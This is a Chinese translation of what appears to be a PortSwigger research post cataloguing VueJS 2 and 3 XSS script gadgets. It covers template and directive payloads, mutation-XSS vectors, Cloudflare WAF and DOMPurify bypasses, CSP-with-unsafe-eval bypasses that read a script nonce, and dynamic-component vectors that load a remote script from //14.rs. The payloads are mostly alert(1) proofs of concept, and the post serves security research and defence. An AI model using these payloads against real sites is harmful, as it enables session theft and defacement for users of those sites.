## 引言

我们发现，流行的 JavaScript 框架 VueJS 提供了一些对网站安全有严重影响的特性。如果你遇到使用 Vue 的 Web 应用程序，本文将帮助你识别由脚本小工具创建的 Vue 特有的 [XSS] 向量，你可以利用它们来攻击目标。

脚本小工具是框架创建的、能够导致 JavaScript 执行的任何附加功能。这些功能可以是基于 JavaScript 或 HTML 的。脚本小工具通常有助于绕过 WAF 和 [CSP] 等防御措施。从开发者的角度来看，了解框架或库创建的所有脚本小工具也很有用；这些知识有助于在允许用户输入进入自己的 Web 应用程序时防止 XSS 漏洞。在本文中，我们将涵盖从基于表达式的向量到变异 XSS（mXSS）的广泛技术。

### 一切的开端

在[发推](https://twitter.com/PortSwiggerRes/status/1265647826383634432?s=20)讨论各种 VueJS 攻击技巧时，我、[Lewis Ardern](https://twitter.com/LewisArdern) 和 [PwnFunction](https://twitter.com/PwnFunction) 决定创建一篇博客文章来更详细地介绍它们。我们在合作和构思一些有趣的向量时玩得很开心。一切都始于尝试缩短以下 [VueJS XSS 向量](https://portswigger-labs.net/xss/vuejs2.php?x=%7B%7BtoString().constructor.constructor(%27alert(1)%27)()%7D%7D)：

```
{{toString().constructor.constructor('alert(1)')()}}
```

为了弄清楚如何缩短它，我们需要了解我们的向量是如何被转换的。我们查看了 VueJS 源代码，搜索 `Function` 构造函数调用。有些地方调用了 `Function` 构造函数，但创建的函数并未被调用。我们跳过了这些地方，因为我们确信我们的代码不是在那里被转换的。[在第 11648 行，我们最终找到了一个调用所生成函数的 Function 构造函数](https://github.com/vuejs/vue/blob/6fe07ebf5ab3fea1860c59fe7cdd2ec1b760f9b0/src/compiler/to-function.js#L14)：

```
return new Function(code)
```

我们在那一行添加了断点并刷新了页面。然后我们检查了 `code` 变量的内容，果然，我们看到了我们的向量。代码位于一个 `with` 语句中，后面跟着一个 `return` 语句。因此，执行代码的作用域位于 `with` 语句指定的对象内。基本上，这意味着没有全局的 `alert()` 函数，但在 `with` 作用域内有 VueJS 函数，例如 `_c`、`_v` 和 `_s`。

如果我们使用这些函数，就可以缩短表达式的大小。这个函数的构造函数将是 `Function` 构造函数，它允许我们执行代码。这意味着我们可以[将向量缩短](https://portswigger-labs.net/xss/vuejs2.php?x=%7B%7B_c.constructor(%27alert(1)%27)()%7D%7D)为：

```
{{_c.constructor('alert(1)')()}}
```

## VueJS 版本 2

### 指令

与其他框架一样，VueJS 中有一些让我们的生活更轻松的指令。几乎每个 VueJS 指令都可以被用作小工具。让我们看一个例子。

**v-show 指令**

```
<p v-show="_c.constructor`alert(1)`()">
```

这是一段相对简单的代码。有一个叫做 `v-show` 的指令，用于根据逻辑条件显示或隐藏 DOM 中的元素。在本例中，条件就是该向量。

这个相同的向量可以应用于其他指令，包括 `v-for`、`v-model`、`v-on` 等。

**v-on 指令**

```
<x v-on:click='_b.constructor`alert(1)`()'>click</x>
```

**v-bind 指令**

```
<x v-bind:a='_b.constructor`alert(1)`()'>
```

这些小工具的多样性可以帮助你创建灵活的向量，非常容易地绕过 WAF。

### 最小化向量

最小化向量——也称为"代码高尔夫"——意味着找到用尽可能少的字符或字节实现相同结果的方法。我们最初假设最短的向量将是模板表达式，这意味着我们仅为了添加所需的花括号 `{{ }}` 就必须使用 4 个字节。然而，这个假设被证明是错误的。

我们花了大量时间调试、查看源代码和阅读文档。我们找不到通过模板缩短向量的方法，所以我们开始研究标签。

我们从 35 字节开始，最终逐步缩短。但在此过程中，我们使用 VueJS 解析器的一些怪癖发现了一些非常有趣的向量：

```
<x @[_b.constructor`alert(1)`()]> (35 字节)
<x :[_b.constructor`alert(1)`()]>  (33 字节)
<p v-=_c.constructor`alert(1)`()> (33 字节)
<x #[_c.constructor`alert(1)`()]> (33 字节)
<p :=_c.constructor`alert(1)`()> (32 字节)
```

但更短的仍然是模板向量：

```
{{_c.constructor('alert(1)')()}}  (32 字节)
{{_b.constructor`alert(1)`()}}     (30 字节)
```

在尝试了无数种代码高尔夫方法，只是为了让它低于 30 字节之后，我们最终在 [Vue API](https://vuejs.org/v2/api/#is) 中遇到了[动态组件](https://vuejs.org/v2/guide/components.html#Dynamic-Components)。

动态组件本质上是可以在稍后时间点更改为不同组件的组件。这是通过在标签上使用 `is` 属性来实现的。考虑以下示例：

```
<x v-bind:is="'script'" src="//14.rs" />
```

这可以缩短为：

```
<x is=script src=//⑭.₨>
```

现在只有 23 个字符和 27 个字节！这是我们在整个研究过程中为 VueJS v2 想出的最短向量。

### 事件

就像 [AngularJS] 一样，VueJS 定义了一个特殊对象 `$event`，它引用浏览器中的事件对象。使用这个 `$event` 对象，你可以访问浏览器 `window` 对象，允许你调用任何你想要的东西：

```
<img src @error="e=$event.path;e[e.length-1].alert(1)">
<img src @error="e=$event.path.pop().alert(1)">
```

我们发现 `@error` 会求值一个表达式，因为 VueJS 提供了[简写语法](https://vuejs.org/v2/guide/syntax.html#v-on-Shorthand)，它允许你为 `error` 或 `click` 等事件的处理程序添加 `@` 前缀，而不必使用 `v-on` 指令。文档还揭示了你可以[使用 `$event` 变量](https://vuejs.org/v2/guide/events.html#Methods-in-Inline-Handlers)来访问原始 DOM 事件。

这些向量之所以有效，要归功于 Chrome 在事件执行时定义的一个特殊 `path` 属性。该属性包含一个触发事件的对象数组。对我们来说至关重要的是，`window` 对象始终是这个数组的最后一个元素。`composedPath()` 函数在其他浏览器中生成类似的数组，这允许我们构造如下跨浏览器向量：

```
<img src @error="e=$event.composedPath().pop().alert(1)">
```

然后我们开始研究如何缩短基于事件的向量，并注意到 VueJS 中一些有趣的行为。VueJS 生成的改写代码使用了 `this`，并且不使用严格模式。因此，当使用函数时，`this` 指向 `window` 对象，允许更短的向量：

```
<img src @error=this.alert(1)>
```

这个概念也可以在不使用事件的情况下演示：

```
{{-function(){this.alert(1)}()}}
```

由于注入的函数继承了全局对象 `window`，当在函数内部时，`this` 指向 `window` 对象。

我们通过使用 SVG 标签和 `load` 事件，成功地将基于事件的向量进一步缩短：

```
<svg @load=this.alert(1)>
```

起初，我们认为这是它可能达到的最小值。但后来我们想到——如果 VueJS 正在解析这些特殊事件，也许它允许正常 HTML 不允许的东西。当然，它确实允许：

```
<svg@load=this.alert(1)>
```

### 静默接收器

默认情况下，当 AngularJS（版本 1）和 VueJS 等框架渲染页面时，它们不执行提前（AoT）补全。这个怪癖意味着，如果你能够注入到使用该框架的模板中，你可能能够偷偷加入自己的任意载荷，它将被执行。

当应用程序部分重构为使用新框架但仍包含依赖额外第三方库的遗留代码时，这有时会导致问题。一个很好的例子是 VueJS 和 JQuery。JQuery 库暴露了各种方法，例如 [`text()`](https://api.jquery.com/text/)。单独来看，它相对安全，不受 XSS 影响，因为它会对其输出进行 HTML 编码。然而，当你将其与使用 Mustache 风格模板语法（如 `{{ }}`）的框架结合使用，并配合只执行文本操作的方法（如 `$('#message').text(userInput)`）时，这可能导致一个"静默"接收器。这是一个有趣的攻击向量，因为你正在向通常被认为安全的方法中引入新的漏洞。例如，在这个 [fiddle](https://jsfiddle.net/4r02y3qa/) 中，注意只有第二个载荷被执行：

```
$('#message').text("'><script>alert(1)<\/script>'");
$('#message1').text("{{_c.constructor('alert(2)')()}}")
```

## 变异 XSS

然后我们开始研究变异 XSS（mXSS）向量，以及如何使用 VueJS 来引发它们。传统上，[mXSS](https://portswigger.net/research/mxss) 向量需要在 DOM 中修改才能变异；反射的输入通常不会变异，因为在注入后 DOM 没有被修改。然而，在 VueJS 的情况下，表达式和 HTML 会被解析并随后被更改，这意味着 DOM 修改确实会发生。因此，被 HTML 过滤器过滤的反射输入可以变成 mXSS！

我们发现的第一种变异是由 VueJS 解析属性的方式引起的。如果你在属性名中使用引号，VueJS 会感到困惑，会解码属性值，然后移除无效的属性名。这会导致 mXSS 并[渲染 iframe](https://portswigger-labs.net/xss/vuejs2.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=alert(1)%26gt;%22%3E)：

输入：

```
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
```

输出：

```
"="<iframe onload="alert(1)">"></iframe>
```

当从相对 URL 引用 VueJS 时这可以工作，但当使用 unpkg.com 域名来提供 JS 时，这返回了 403，因为服务器使用 Cloudflare，它因为引用者中的向量而阻止了请求。我们能够通过一些技巧绕过这一点：

```
<a href="https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=setTimeout(top.name)%26gt;%22%3E" target=alert(1337)>test</a>
```

我们使用 htmlentities 来欺骗 Cloudflare WAF 允许 `onload` 事件，然后使用 `setTimeout()`，它求值一个字符串并将 window 名称传递给它。后来，我们发现可以[简化绕过](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=setTimeout(/alert(1)/.source)%26gt;%22%3E)如下：

```
<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">
```

我们还进行了模糊测试以寻找更多变异，发现以下示例也会变异：

```
<x < x="&lt;iframe onload=alert(0)&gt;">
<x = x="&lt;iframe onload=alert(0)&gt;">
<x ' x="&lt;iframe onload=alert(0)&gt;">
```

进一步的实验揭示了其他 mXSS 行为。通常，template 标签内的标签不会被渲染。然而，事实证明 VueJS 会移除 `<template>` 标签，同时保留其中的标记。剩余的标记随后会被渲染：

输入：

```
<template><iframe></iframe></template>
```

在开发者工具控制台中输入：

```
document.body.innerHTML+=''
```

输出：

```
<iframe></iframe>
```

由于 VueJS 会移除 `<template>` 标签，我们想知道是否可以利用这一点来引发变异。我们将 `<template>` 标签放在另一个标签内，[惊讶地看到了这种变异](https://portswigger-labs.net/xss/vuejs.php?x=%3Cxmp%3E%3C%3Ctemplate%3E%3C/template%3E/xmp%3E%3C%3Ctemplate%3E%3C/template%3Eiframe%3E%3C/xmp%3E)：

输入：

```
<xmp><<template></template>/xmp><<template></template>iframe></xmp>
```

在开发者工具控制台中输入：

```
document.body.innerHTML+=''
```

输出：

```
<xmp></xmp><iframe></xmp>
```

我们还发现 `<noscript>` 也会在 DOM 操作时发生变异：

```
<noscript>&lt;/noscript&gt;&lt;iframe&gt;</noscript>
```

在开发者工具控制台中输入：

```
document.body.innerHTML+=''
```

同样的情况甚至适用于 [XMP](https://portswigger-labs.net/xss/vuejs.php?x=%3Cxmp%3E%26lt;/xmp%26gt;%26lt;iframe%26gt;%3C/xmp%3E)：

输入：

```
<xmp>&lt;/xmp&gt;&lt;iframe&gt;</xmp>
```

在开发者工具控制台中输入：

```
document.body.innerHTML+=''
```

我们最终发现这些变异在 `<noframes>`、`<noembed>` 和 `<iframe>` 元素中也是可能的。这很有趣，但我们真正需要的是一种通过 VueJS 引发变异而无需任何手动 DOM 操作的方法。在寻找变异的过程中，我们意识到 VueJS 会变异 HTML。我们想出了一个简单的测试来证明这一点。通常，如果你将一个标签放在另一个标签内，只有第一个标签会被渲染，因为找不到第二个标签的闭合 `>`。另一方面，VueJS 实际上会[变异并为你移除第一个标签](https://portswigger-labs.net/xss/vuejs2.php?x=%3Cxyz%3Cimg/src%20onerror=alert(1)%3E%3E)：

输入：

```
<xyz<img/src onerror=alert(1)>>
```

输出：

```
<img src="" onerror="alert(1)">>
```

接下来，我们需要创建一个向量，它能够绕过 HTML 过滤器，然后在变异后变得危险。经过许多小时的尝试，我们发现如果使用多个 SVG 标签，你可以导致 DOM 被 VueJS 修改。这引发了一次变异，[将反射型 XSS 转化为 mXSS](https://portswigger-labs.net/xss/vuejs2.php?x=%3Csvg%3E%3Csvg%3E%3Cb%3E%3Cnoscript%3E%26lt;/noscript%26gt;%26lt;iframe%26Tab;onload=alert(1)%26gt;%3C/noscript%3E%3C/b%3E%3C/svg%3E)：

输入：

```
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=alert(1)&gt;</noscript></b></svg>
```

输出：

```
<p><svg><svg></svg></svg><b><noscript></noscript><iframe onload="alert(1)"></iframe></b></p>
```

最后，这是另一个会变异并[绕过 Cloudflare WAF](https://portswigger-labs.net/xss/vuejs.php?x=%3Csvg%3E%3Csvg%3E%3Cb%3E%3Cnoscript%3E%26lt;/noscript%26gt;%26lt;iframe%26Tab;onload=setTimeout(/alert(1)/.source)%26gt;%3C/noscript%3E%3C/b%3E%3C/svg%3E) 的 PoC：

输入：

```
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>
```

输出：

```
<svg><svg></svg></svg><b><noscript></noscript><iframe onload="setTimeout(/alert(1)/.source)"></iframe></b>
```

### 变异与 CSP

我们注意到当启用 CSP 时变异不起作用。这是因为它们包含普通的 DOM 事件处理程序，被 CSP 阻止了。但后来我们想到——如果我们注入带有 VueJS 特殊事件的变异 HTML 呢？这将被 VueJS 渲染，执行我们的代码和自定义事件处理程序，从而绕过 CSP。我们不确定变异的 DOM 是否会执行这些处理程序，但令我们高兴的是，它确实执行了！

首先，我们注入了一个带图像的变异向量，并使用 VueJS 的 `@error` 事件处理程序。当 DOM 被变异时，图像会连同 `@error` 处理程序一起被渲染。然后我们使用特殊的 `$event` 对象来获取对 `window` 的引用并执行我们的 `alert()`：

输入：

```
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;img/src/&Tab;@error=$event.path.pop().alert(1)&gt;</noscript></b></svg>
```

输出：

```
<p><svg><svg></svg></svg><b><noscript></noscript><img src=""></b></p>
```

变异的 DOM 不会显示 `@error` 事件，但它仍然执行。你可以在以下示例中看到这一点：

[mXSS 与 CSP 启用](https://portswigger-labs.net/xss/vue3.php?x=%3Csvg%3E%3Csvg%3E%3Cb%3E%3Cnoscript%3E%26lt;/noscript%26gt;%26lt;img/src/%26Tab;@error=$event.path.pop().alert(1)%26gt;%3C/noscript%3E%3C/b%3E%3C/svg%3E&csp=1)

**本节中的变异向量也适用于版本 3。**

[概念验证](https://portswigger-labs.net/xss/vue3.php?x=%3Csvg%3E%3Csvg%3E%3Cb%3E%3Cnoscript%3E%26lt;/noscript%26gt;%26lt;iframe%26Tab;onload=alert(1)%26gt;%3C/noscript%3E%3C/b%3E%3C/svg%3E)

## 适配 VueJS 3 的载荷

在我们进行这项研究时，VueJS 3 发布了，打破了我们发现的许多向量。我们决定快速研究一下，看看能否让它们重新工作。版本 3 中很多代码都发生了变化，例如，`Function` 构造函数已移至第 13035 行，VueJS 函数的缩短版本（如 `_b`）已被移除。

在第 13055 行添加断点后，我们检查了 `code` 变量的内容。似乎 VueJS 具有与版本 2 类似的功能；只是它们的函数名更冗长。我们只需要用更长的形式替换函数的短形式：

```
{{_openBlock.constructor('alert(1)')()}}
```

执行表达式的作用域内有几个不同的函数可用：

```
{{_createBlock.constructor('alert(1)')()}}
{{_toDisplayString.constructor('alert(1)')()}}
{{_createVNode.constructor('alert(1)')()}}
```

本文中的大多数向量只需使用更冗长的函数就可以在 v3 上工作：

```
<p v-show="_createBlock.constructor`alert(1)`()">
```

有些情况下载荷无法执行，例如使用以下向量时：

```
<x @[_openBlock.constructor`alert(1)`()]>
```

这会失败，因为表达式被 VueJS 转换为小写，导致它尝试调用不存在的 `_objectblock` 函数……为了解决这个问题，我们使用了作用域内的 `_capitalize` 函数：

```
<x @[_capitalize.constructor`alert(1)`()]>
```

事件也暴露了不同的函数。除了我们之前讨论的 `$event` 对象外，还有 `_withCtx` 和 `_resolveComponent`。后者有点太长，但 `_withCtx` 很好且简短：

```
<x @click=_withCtx.constructor`alert(1)`()>click</x>
```

使用 `$event` 也是一个方便的捷径：

```
<x @click=$event.view.alert(1)>click</x>
```

### V3 中的代码高尔夫

我们的向量现在可以在 v3 中工作了，但它们仍然相当长。我们寻找更短的函数名，并注意到有一个名为 `_Vue` 的变量，它位于当前作用域中。我们将这个变量传递给 `Function` 构造函数，并使用 `console.log()` 检查对象的内容：

```
{{_createBlock.constructor('x','console.log(x)')(_Vue)}}
```

这看起来只是对 `Vue` 全局的引用，正如预期的那样，但该对象有一个名为 `h` 的函数。这是一个很好的短函数名，我们可以用它来缩短向量：

```
{{_Vue.h.constructor`alert(1)`()}}
```

在尝试找到进一步缩短的方法时，我们从一个基本向量开始，并注入了一个 `Function` 构造函数调用。但这次，我们不只是调用 `alert()`，而是将我们想要检查的对象传递给我们函数，并使用 `console.log()` 检查对象/代理的内容。代理是一种特殊的 JavaScript 对象，允许我们拦截对被代理对象的操作，例如 get/set 操作或函数调用。Vue 使用代理，以便它们可以向表达式提供可在当前作用域内使用的函数/属性。我们使用的表达式如下：

```
{{_Vue.h.constructor('x','console.log(x)')(this)}}
```

这将在控制台窗口中输出一个对象。如果你检查代理的 `[[Target]]` 属性，你将能够看到可以使用的潜在函数。使用这种方法，我们识别出了函数 `$nextTick`、`$watch`、`$forceUpdate` 和 `$emit`。使用其中最短的，我们能够产生以下向量：

```
{{$emit.constructor`alert(1)`()}}
```

你已经看到了我们为 VueJS v2 的最短向量：

```
<x is=script src=//14.rs>
```

这不起作用，因为 VueJS v3 尝试解析一个名为 `x` 的组件，而它因为 `x` 是原生标签而不存在。以下代码是 `render()` 函数的一部分。

```
return function render(_ctx, _cache) {
  with (_ctx) {
    ...
    const _component_x = _resolveComponent("x")
    ...
  }
}
```

然而，有一个特殊的 `<component>` 标签，用于与 `is` [携手](https://github.com/vuejs/vue-next/blob/24041b7ac1a22ca6c10bf2af81c9250af26bda34/packages/compiler-core/src/transforms/transformElement.ts#L342)创建动态组件。所以我们只需将 `x` 改为 `component`。

```
<component is=script src=//14.rs>
```

对于上述向量，`render()` 函数看起来像这样：

```
return function render(_ctx, _cache) {
  with (_ctx) {
    ...
    return (_openBlock(),
      _createBlock(_resolveDynamicComponent("script"),
      { src: "//⑭.₨" }))
  }
}
```

因此，VueJS v3 的最短向量是 31 字节。

```
<component is=script src=//⑭.₨>
```

在版本 3 中，可以将 DOM 属性用作 `<component>` 标签的属性。这意味着你可以使用 DOM 属性 `text`，它将被作为文本节点添加到 `<script>` 标签中，然后被添加到 DOM。

```
<component is=script text=alert(1)>
```

## Teleport

我们在 VueJS 3 中遇到了一个非常有趣的新标签，叫做 `<teleport>`。这个标签允许你通过使用 `to` 属性（接受 CSS 选择器）将 `<teleport>` 标签的内容传输到任何其他标签：

```
<teleport to="#x"><b>test</b></teleport>
```

即使对于文本节点，标签的内容也会被传输。这意味着我们可以对文本节点进行 HTML 编码，它会在被传输之前被解码。这适用于

```
<script>
```

和

```
<style>
```

标签，尽管在我们的测试中，我们发现你需要一个已存在的空白

```
<script>
```

元素：

```
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
```

[概念验证](https://portswigger-labs.net/xss/vue3.php?x=%3Cteleport%20to=script:nth-child(2)%3Ealert%26lpar;1%26rpar;%3C/teleport%3E%3C/div%3E%3Cscript%3E%3C/script%3E)

在这个例子中，当前样式是蓝色，但我们注入一个 `<teleport>` 标签来更改内联样式表的样式。然后文本变为红色：

```
  <teleport to="style">
    /* 可以被实体编码 */
    h1 {
      color: red;
    }
  </teleport> 
</div> 
 <h1>aaaa</h1>
<style>
  h1 {
    color: blue;
  }
</style>
```

[概念验证](http://portswigger-labs.net/xss/vue3.php?x=%3Cteleport%20to=%22style%22%3E%20h1%20%26lcub;%20color:%20red;%20%7D%20%3C/teleport%3E%20%3C/div%3E%20%3Ch1%3Eaaaa%3C/h1%3E%20%3Cstyle%3E%20h1%20%7B%20color:%20blue;%20%7D%20%3C/style%3E)

你可以将 HTML 编码与 JavaScript 中的 unicode 转义结合使用，生成一些可能绕过一些 WAF 的不错向量：

```
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
```

[概念验证](http://portswigger-labs.net/xss/vue3.php?x=%3Cteleport%20to=script:nth-child(2)%3Ealert%26lpar;1%26rpar;%3C/teleport%3E%3C/div%3E%3Cscript%3E%3C/script%3E)

### 反向 teleport

我们还发现了一些我们决定称之为"反向 teleport"的东西。我们已经讨论过 VueJS 有一个 `<teleport>` 标签，但如果你在模板表达式中包含一个 CSS 选择器，你可以针对任何其他 HTML 元素并将该元素的内容作为表达式执行。即使目标标签在应用程序边界之外，这也能工作！

当我们意识到 VueJS 会[对整个表达式内容运行 `querySelector`](https://github.com/vuejs/vue-next/blob/fbf865d9d4744a0233db1ed6e5543b8f3ef51e8d/packages/vue/src)（只要它以 `#` 开头）时，我们都感到非常震惊。以下代码片段演示了一个带有 CSS 查询的表达式，该查询针对 class 为 `haha` 的 `<div>`。即使第二个表达式位于应用程序边界之外，它也会被执行。

```
<div id="app">#x,.haha</div><div class=haha>{{_Vue.h.constructor`alert(1)`()}}</div>
<!-- 注意上面的 div 位于应用程序 div 之外 -->
<script src="vue3.js"></script>
<script nonce="sometoken">
const app = Vue.createApp({
  data() {
    return {
      input: '# hello'
    }
  }
})
app.mount('#app')
</script>
```

## 用例

在本节中，我们将仔细研究这些脚本小工具有用的地方。

### WAF

让我们从 Web 应用程序防火墙开始。正如我们已经看到的，有大量潜在的小工具可供发现。由于 Vue 也乐于解码 HTML 实体，你很可能能够绕过常见的 WAF，例如 Cloudflare。

### 净化器

诸如 [DOMPurify](https://github.com/cure53/DOMPurify) 之类的净化器拥有非常好的标签和属性白名单，有助于阻止任何被认为不正常的内容。然而，由于它们都允许模板语法，当与 VueJS 等前端框架结合使用时，它们无法提供针对 XSS 攻击的稳健保护。

### CSP

Vue 通过执行内容的词法分析并将其解析为抽象语法树（AST）来工作。代码作为字符串传递到渲染函数中，由于 `Function` 构造函数类似 eval 的功能而被执行。这意味着 CSP 必须以允许 VueJS 和应用程序仍能正常工作的方式定义。如果它包含 `unsafe-eval`，你可以轻松地使用 Vue 绕过 CSP。请注意，对于 `strict-dynamic` 或 `nonce` 绕过，`unsafe-eval` 是必需的。

unsafe-eval + nonce：

```
// v2
{{_c.constructor`alert(document.currentScript.nonce)`()}} 
// v3
{{_Vue.h.constructor`alert(document.currentScript.nonce)`()}}
```

本文中的大多数向量适用于 CSP。唯一的例外是动态组件和基于 teleport 的向量。这是因为它们尝试将脚本节点附加到文档，而 CSP 会阻止这一点（取决于策略）。
